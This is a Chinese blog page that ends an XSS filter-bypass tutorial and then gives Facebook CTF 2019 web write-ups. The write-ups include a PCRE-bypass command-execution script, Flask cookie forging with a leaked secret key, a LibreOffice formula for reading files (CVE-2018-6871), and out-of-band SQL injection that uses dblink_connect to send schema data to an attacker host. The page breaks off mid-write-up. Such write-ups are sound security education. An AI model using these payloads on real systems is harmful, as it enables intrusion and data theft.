<table><br>  <tr><th>PAYLOAD</th><th>ACTION</th><br>  </tr><tr><td><code>self[&quot;$&quot;][&quot;globalEval&quot;](&quot;alert(1)&quot;);</code></td><td>pass</td></tr><br>  <tr><td><code>self[&quot;\x24&quot;]
[&quot;\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c&quot;]
(&quot;\x61\x6c\x65\x72\x74\x28\x31\x29&quot;);</code></td><td>pass</td></tr><br></table> 


<p>你可以轻易添加一个本地或远程脚本利用<code>self[&quot;$&quot;][&quot;getScript&quot;](url)</code>来进行加载，<code>. getScript</code>以<code>get</code>请求的方式从服务器加载一个js文件。该脚本在全局上下文中执行，因此它可以引用其他变量并使用jQuery函数。</p>
<table>
<thead>
<tr>
<th style="text-align:left">PAYLOAD</th>
<th style="text-align:left">ACTION</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>self[&quot;$&quot;][&quot;getScript&quot;](&quot;https://example.com/my.js&quot;);</code></td>
<td style="text-align:left">pass</td>
</tr>
</tbody>
</table>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-12.png" alt=""></p>
<h2 id="4-Iteration-and-Object-keys"><a href="#4-Iteration-and-Object-keys" class="headerlink" title="4.Iteration and Object.keys"></a>4.Iteration and Object.keys</h2><p><code>Object.keys()</code>以数组形式返回所给的对象所拥有的属性（property）名称，与正常循环相同的顺序。<br><img src="https://www.secjuice.com/content/images/2019/06/image.png" alt=""></p>
<p>这意味着我们可以通过使用索引号而不是函数名来访问任何JavaScript函数。例如，打开浏览器的Web控制台并键入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=0; for(i in self) &#123; if(i == &quot;alert&quot;) &#123; console.log(c); &#125; c++; &#125;</span><br></pre></td></tr></table></figure></p>
<p>这为您提供了self对象中“alert”函数的索引号。每个浏览器和每个打开的文档（在我的示例中为5）的数字不同，但它可以使您无需使用其名称即可调用任何函数。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; Object.keys(self)[5]</span><br><span class="line">&lt; &quot;alert&quot;</span><br><span class="line">&gt; self[Object.keys(self)[5]](&quot;foo&quot;) // alert(&quot;foo&quot;)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-1.png" alt=""></p>
<p>为了迭代<code>self</code>中的所有函数，你可以遍历<code>self</code>对象并检查元素是否是使用<code>typeof elm ===“function”</code>的函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f=&quot;&quot;</span><br><span class="line">for(i in self) &#123;</span><br><span class="line">    if(typeof self[i] === &quot;function&quot;) &#123;</span><br><span class="line">        f += i+&quot;, &quot;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br><span class="line">console.log(f)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-14.png" alt=""></p>
<p>如前所述，这个数字可以在不同的浏览器和文档上更改，因此，如果不允许“alert”字符串并且不能使用上述任何方法，我们如何找到“alert”索引号？JavaScript为您提供了很多机会。我们可以做的一件事是为变量分配（a），一个迭代<code>self</code>并找到<code>alert</code>索引号的函数。然后，我们可以使用<code>test（）</code>来查找带有正则表达式的“alert”，如<code>^ a [rel] + t $</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a = function() &#123;</span><br><span class="line">    c=0; // index counter</span><br><span class="line">    for(i in self) &#123;</span><br><span class="line">        if(/^a[rel]+t$/.test(i)) &#123;</span><br><span class="line">            return c;</span><br><span class="line">        &#125;</span><br><span class="line">        c++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// in one line</span><br><span class="line">a=()=&gt;&#123;c=0;for(i in self)&#123;if(/^a[rel]+t$/.test(i))&#123;return c&#125;c++&#125;&#125;</span><br><span class="line"></span><br><span class="line">// then you can use a() with Object.keys</span><br><span class="line">// alert(&quot;foo&quot;)</span><br><span class="line"></span><br><span class="line">self[Object.keys(self)[a()]](&quot;foo&quot;)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-7.png" alt=""></p>
<p>注：</p>
<blockquote>
<p>test() 方法用于检测一个字符串是否匹配某个模式.<br>语法：<br>RegExpObject.test(string)</p>
<p>返回值：<br>如果字符串 string 中含有与 RegExpObject 匹配的文本，则返回 true，否则返回 false。</p>
<p>说明：<br>调用 RegExp 对象 r 的 test() 方法，并为它传递字符串 s，与这个表示式是等价的：(r.exec(s) != null)。</p>
</blockquote>
<p>原文地址：<br><a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/" target="_blank" rel="noopener">https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/xss/">xss</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/06/12/CTF/fbctf2019/"><span>fbctf2019</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/06/12/CTF/fbctf2019/" rel="bookmark">
        <time class="entry-date published" datetime="2019-06-11T17:27:45.567Z">
          2019-06-12
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="Facebook-ctf-2019"><a href="#Facebook-ctf-2019" class="headerlink" title="Facebook ctf 2019"></a>Facebook ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="rceservice"><a href="#rceservice" class="headerlink" title="rceservice"></a>rceservice</h3><p>题目描述：</p>
<blockquote>
<p>We created this web interface to run commands on our servers, but since we haven’t figured out how to secure it yet we only let you run ‘ls’</p>
<p><a href="http://challenges.fbctf.com:8085" target="_blank" rel="noopener">http://challenges.fbctf.com:8085</a></p>
<p>(This problem does not require any brute force or scanning.<br>We will ban your team if we detect brute force or scanning).</p>
</blockquote>
<p>要求用<code>json</code>格式传送payload<br><img src="https://ramadistra.dev/static/69bcde5f2a66779950b04b31626c4e7a/92980/initial.webp" alt=""></p>
<p>我们尝试<code>ls</code>：<code>{&quot;cmd&quot;:&quot;ls&quot;}</code></p>
<p><img src="https://ramadistra.dev/static/ef292e7c05d67c2b8f563690c770eb69/889a8/ls.webp" alt=""></p>
<p>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&apos;PATH=/home/rceservice/jail&apos;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&apos;cmd&apos;])) &#123;</span><br><span class="line">  $json = $_REQUEST[&apos;cmd&apos;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; elseif (preg_match(&apos;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&apos;, $json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &apos;Attempting to run command:&lt;br/&gt;&apos;;</span><br><span class="line">    $cmd = json_decode($json, true)[&apos;cmd&apos;];</span><br><span class="line">    if ($cmd !== NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &apos;Invalid input&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>暴躁过滤，在线砍人<br>但是我们看到了<code>preg_match</code>,就会想到p神曾经提到的PRCE，利用如下的exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &apos;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&apos; + &quot;a&quot;*(1000000) + &apos;&quot;&#125;&apos;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://challenges.fbctf.com:8085/&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></p>
<p>另一种方法，同样是<code>preg_match</code>的问题，由于它会努力去匹配第一行，所以我们可以利用<strong>多行</strong>的方法</p>
<p><img src="https://i.loli.net/2019/06/10/5cfe6008e1fb886158.png" alt=""></p>
<p>尝试直接<code>cat</code>，但是返回了空白<br>我们返回去查看源代码：<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，jail应用于当前环境，又根据题目描述的提示–“只允许执行ls命令”，即jail包含了执行<code>ls</code>的二进制文件，所以我们可以直接拉出<code>cat</code>的路径：<code>&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;</code></p>
<blockquote>
<p>注：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p>
</blockquote>
<h3 id="events"><a href="#events" class="headerlink" title="events"></a>events</h3><p>题目描述：</p>
<blockquote>
<p>I heard cookies and string formatting are safe in 2019?</p>
<p><a href="http://challenges.fbctf.com:8083" target="_blank" rel="noopener">http://challenges.fbctf.com:8083</a></p>
<p>(This problem does not require any brute force or scanning. We will ban your team if we detect brute force or scanning).</p>
</blockquote>
<p>登录<br><img src="https://i.loli.net/2019/06/10/5cfe6bab2297446330.png" alt=""></p>
<p>观察cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImEi.XP5j-w.rHcMilGKzEg1FYfcEOR6iqa-B9A</span><br></pre></td></tr></table></figure></p>
<p>似乎有三段，但加密方式未知，密钥未知<br>我们尝试提交数据，注意到有三个参数需要提交：<br><img src="https://i.loli.net/2019/06/10/5cfe6cc46116a77936.png" alt=""></p>
<p>既然提示了<code>cookie</code>和<code>string format</code>，admin是未允许的状态，所以思路是篡改cookie，伪装为admin，继而拿到flag，通常有一个思路是：利用SSTI，获取密钥，然后重新签名生成cookie。所以如何利用SSTI呢？<br>通过一番尝试，三个参数中，<code>event_important</code>是可利用点</p>
<ul>
<li>我们输入<code>__dict__</code>，成功回显</li>
</ul>
<p><img src="https://i.loli.net/2019/06/10/5cfe7273070fc54701.png" alt=""></p>
<ul>
<li><p>查找配置文件：<code>__class__.__init__.__globals__[app].config</code><br><img src="https://i.loli.net/2019/06/10/5cfe73cb3856843642.png" alt=""></p>
</li>
<li><p>于是进行签名</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = b&apos;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&apos;</span><br><span class="line"></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    print(session_serializer.dumps(&quot;admin&quot;))</span><br><span class="line"></span><br><span class="line">index()</span><br></pre></td></tr></table></figure>
<p>将得到的cookie去修改原<code>user</code>的cookie即可得到flag</p>
<h3 id="products-manager"><a href="#products-manager" class="headerlink" title="products manager"></a>products manager</h3><p>题目给出了源码：</p>
<ul>
<li>在db.php中：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">INSERT INTO products VALUES(&apos;facebook&apos;, sha256(....), &apos;FLAG_HERE&apos;);</span><br><span class="line">INSERT INTO products VALUES(&apos;messenger&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;instagram&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;whatsapp&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;oculus-rift&apos;, sha256(....), ....);</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p>给出了表结构，且提示很明显，再看主页面：<br><img src="https://i.loli.net/2019/06/11/5cfe8685b49df61035.png" alt=""></p>
<p>三个功能，add是添加产品<br><img src="https://i.loli.net/2019/06/11/5cfe86c76c0c145917.png" alt=""></p>
<p>view可以查询<br><img src="https://i.loli.net/2019/06/11/5cfe8707a0af441607.png" alt=""><br>我们再查看view.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($name) &amp;&amp; $name !== &quot;&quot;</span><br><span class="line">      &amp;&amp; isset($secret) &amp;&amp; $secret !== &quot;&quot;) &#123;</span><br><span class="line">  if (check_name_secret($name, hash(&apos;sha256&apos;, $secret)) === false) &#123;</span><br><span class="line">    return &quot;Incorrect name or secret, please try again&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  $product = get_product($name);</span><br><span class="line">  echo &quot;&lt;p&gt;Product details:&quot;;</span><br><span class="line">  echo &quot;&lt;ul&gt;&lt;li&gt;&quot; . htmlentities($product[&apos;name&apos;]) . &quot;&lt;/li&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;li&gt;&quot; . htmlentities($product[&apos;description&apos;]) . &quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;;</span><br></pre></td></tr></table></figure></p>
<p>/db.php::check_name_secret源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function check_name_secret($name, $secret) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $valid = false;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;</span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(&quot;ss&quot;, $name, $secret);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  if ($res-&gt;fetch_assoc() !== null) &#123;</span><br><span class="line">    $valid = true;</span><br><span class="line">  &#125;</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  return $valid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>/db.php::get_product源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function get_product($name) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name, description FROM products WHERE name = ?&quot;</span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(&quot;s&quot;, $name);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  $product = $res-&gt;fetch_assoc();</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  return $product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>check的时候会将name和secret一并查询，但返回product时只查询name，所以此时便有了可利用点<br>这里涉及到mysql的一个问题，查询的时候将会忽略字符串尾部的空格<br><img src="https://i.loli.net/2019/06/11/5cfe897b3282f80821.png" alt=""></p>
<p>于是我们可以添加一个facebook尾部带n个空格的product，添加成功后再进行查询，便能得到flag</p>
<h3 id="pdfme"><a href="#pdfme" class="headerlink" title="pdfme"></a>pdfme</h3><p><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/start.png" alt=""><br>只能上传<code>.fods</code>文件，在网上找了个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;office:document xmlns:office=&quot;urn:oasis:names:tc:opendocument:xmlns:office:1.0&quot;  xmlns:style=&quot;urn:oasis:names:tc:opendocument:xmlns:style:1.0&quot;  xmlns:text=&quot;urn:oasis:names:tc:opendocument:xmlns:text:1.0&quot;  xmlns:table=&quot;urn:oasis:names:tc:opendocument:xmlns:table:1.0&quot;  xmlns:draw=&quot;urn:oasis:names:tc:opendocument:xmlns:drawing:1.0&quot;  xmlns:fo=&quot;urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0&quot;  xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;  xmlns:meta=&quot;urn:oasis:names:tc:opendocument:xmlns:meta:1.0&quot;  xmlns:number=&quot;urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0&quot;  xmlns:presentation=&quot;urn:oasis:names:tc:opendocument:xmlns:presentation:1.0&quot;  xmlns:svg=&quot;urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0&quot;  xmlns:chart=&quot;urn:oasis:names:tc:opendocument:xmlns:chart:1.0&quot;  xmlns:dr3d=&quot;urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0&quot;  xmlns:math=&quot;http://www.w3.org/1998/Math/MathML&quot;  xmlns:form=&quot;urn:oasis:names:tc:opendocument:xmlns:form:1.0&quot;  xmlns:script=&quot;urn:oasis:names:tc:opendocument:xmlns:script:1.0&quot;  xmlns:config=&quot;urn:oasis:names:tc:opendocument:xmlns:config:1.0&quot;  xmlns:ooo=&quot;http://openoffice.org/2004/office&quot;  xmlns:ooow=&quot;http://openoffice.org/2004/writer&quot;  xmlns:oooc=&quot;http://openoffice.org/2004/calc&quot;  xmlns:dom=&quot;http://www.w3.org/2001/xml-events&quot;  xmlns:xforms=&quot;http://www.w3.org/2002/xforms&quot;  xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xmlns:rpt=&quot;http://openoffice.org/2005/report&quot;  xmlns:of=&quot;urn:oasis:names:tc:opendocument:xmlns:of:1.2&quot;  xmlns:xhtml=&quot;http://www.w3.org/1999/xhtml&quot;  xmlns:grddl=&quot;http://www.w3.org/2003/g/data-view#&quot;  xmlns:tableooo=&quot;http://openoffice.org/2009/table&quot;  xmlns:drawooo=&quot;http://openoffice.org/2010/draw&quot;  xmlns:calcext=&quot;urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0&quot;  xmlns:loext=&quot;urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0&quot;  xmlns:field=&quot;urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0&quot;  xmlns:formx=&quot;urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0&quot;  xmlns:css3t=&quot;http://www.w3.org/TR/css3-text/&quot; office:version=&quot;1.2&quot; office:mimetype=&quot;application/vnd.oasis.opendocument.spreadsheet&quot;&gt;</span><br><span class="line">    &lt;office:body&gt;</span><br><span class="line">        &lt;office:spreadsheet&gt;</span><br><span class="line">            &lt;table:table table:name=&quot;1&quot;&gt;</span><br><span class="line">                &lt;table:table-column/&gt;</span><br><span class="line">                &lt;table:table-row&gt;</span><br><span class="line">                    &lt;table:table-cell office:value-type=&quot;string&quot; calcext:value-type=&quot;string&quot;&gt;</span><br><span class="line">                        &lt;text:p&gt;TEXT&lt;/text:p&gt;</span><br><span class="line">                    &lt;/table:table-cell&gt;</span><br><span class="line">                &lt;/table:table-row&gt;</span><br><span class="line">                &lt;table:table-row&gt;&lt;/table:table-row&gt;</span><br><span class="line">            &lt;/table:table&gt;</span><br><span class="line">            &lt;table:named-expressions/&gt;</span><br><span class="line">        &lt;/office:spreadsheet&gt;</span><br><span class="line">    &lt;/office:body&gt;</span><br><span class="line">&lt;/office:document&gt;</span><br></pre></td></tr></table></figure></p>
<p>他会渲染为pdf：</p>
<p><img src="https://i.loli.net/2019/06/11/5cfe8ff9c303f36290.png" alt=""><br>将pdf下载下来，利用exiftool查看文件信息：<br><img src="https://i.loli.net/2019/06/11/5cff2e6c83e7924512.png" alt=""><br>注意到<strong>libreoffice</strong>，查找相关漏洞，最后落到了<a href="https://www.exploit-db.com/exploits/44022" target="_blank" rel="noopener">CVE-2018-6871</a>，差不多是协议的问题：</p>
<blockquote>
<p>For protocols that are not supported, such as ftp: // or file: //, WEBSERVICE returns the #VALUE! error value.</p>
<p>In LibreOffice, these restrictions are not implemented before 5.4.5/6.0.1</p>
</blockquote>
<p>将<code>table:table-cell</code>这一部分进行替换，改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;table:table-cell </span><br><span class="line">     table:formula=&quot;of:=COM.MICROSOFT.WEBSERVICE(&amp;quot;/etc/passwd&amp;quot;)&quot; </span><br><span class="line">     office:value-type=&quot;string&quot; </span><br><span class="line">     office:string-value=&quot;&quot; </span><br><span class="line">     calcext:value-type=&quot;string&quot;&gt;</span><br><span class="line">  &lt;text:p&gt;#VALUE!&lt;/text:p&gt;</span><br><span class="line">&lt;/table:table-cell&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到：<br><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/passwd.png" alt=""><br>根据给出的用户，于是我们尝试查询<code>/home/libreoffice_admin/flag</code>,最终读到flag<br><img src="https://i.loli.net/2019/06/11/5cff3642cb56094273.png" alt=""></p>
<h3 id="hr-admin-module"><a href="#hr-admin-module" class="headerlink" title="hr_admin_module"></a>hr_admin_module</h3><p>题目描述：</p>
<blockquote>
<p>While tying down the application the developer may have had trouble revoking the permission on one or two functions. Let’s hope this got sorted. At least he made sure the site feels really fast.</p>
<p><a href="http://challenges.fbctf.com:8081" target="_blank" rel="noopener">http://challenges.fbctf.com:8081</a></p>
</blockquote>
<p><img src="https://i.loli.net/2019/06/12/5d00bb9fc0c9c75902.png" alt=""><br>有两个搜索框，从error似乎给出了一些提示，数据库为<code>postgresql</code>，<code>user</code>框禁止了输入，于是尝试利用<code>employees</code>框，但没卵用，关注地址栏：<br><img src="https://i.loli.net/2019/06/12/5d00bc9e9c61624776.png" alt=""></p>
<p>尝试将<code>employee</code>改为<code>user</code>，输入<code>admin&#39;</code>，奏效了，弹出warning：</p>
<blockquote>
<p>This is a warning alert—check it out!</p>
</blockquote>
<p>尝试输入<code>secret</code>，同样弹出上述警报<br>输入<code>admin%27--</code>，无警报</p>
<p>fuzz一阵，会发现回显只有有无warning的区别，但尝试利用<code>pg_sleep</code>，返回结果没有时延，所以我们可以猜测后台是异步执行，且一般盲注不起效果</p>
<p><strong>带外注入（OOB）：</strong></p>
<blockquote>
<p>带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用所谓的盲目(blind)的漏洞。在这种盲目的漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功是基于防火墙出站规则的，即允许存在漏洞的系统和外围防火墙的出站请求</p>
</blockquote>
<p>我们大致有两种方式：</p>
<ol>
<li>dnslog，搭建dns服务器，将域名指向自己的服务器，利用dns进行解析，然后请求自己的二级或三级域名，在dns解析日志中去查看他们</li>
<li>因为<code>dblink_connect</code>可用，我们可以尝试搭建一个<code>postgresql</code>服务，然后建立一个远程会话连接，连接到我们的<code>psql</code>服务，监听服务端口，查看请求包的明文信息</li>
</ol>
<p>第二个方法似乎更为简单</p>
<p><code>dblink</code>是一个支持在一个数据库会话中连接到其他PostgreSQL数据库的模块。<br><code>dblink_connect</code> – 打开一个到远程数据库的持久连接</p>
<p>在自己的服务器上安装<code>postgresql</code>，在配置文件<code>postgresql.conf</code>中设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen_addresses = &apos;*&apos;</span><br></pre></td></tr></table></figure></p>
<p>利用tcpdump监听<code>5432</code>端口，查看请求包的信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -nX -i eth0 port 5432</span><br></pre></td></tr></table></figure></p>
<p>postgresql安装后默认用户为<code>postgres</code>，无密码，且有一个<code>postgres</code>的数据库，有意思的一点是，建议将密码或用户参数填写错误，因为这样才能返回查询信息</p>
<p>修改payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=postgres password= dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p>携带了连接信息：<br><img src="https://i.loli.net/2019/06/13/5d01fb1ee087f78253.png" alt=""></p>
<p>列出schema：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(schema_name,&apos;:&apos;) FROM information_schema.schemata) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d01fbce5191773760.png" alt=""></p>
<blockquote>
<p>String_agg：有两个参数一个是需要合并的字段名称或者字面量，还有就是合并后以何种分隔符，即：string_agg(expression, delimiter)。</p>
</blockquote>
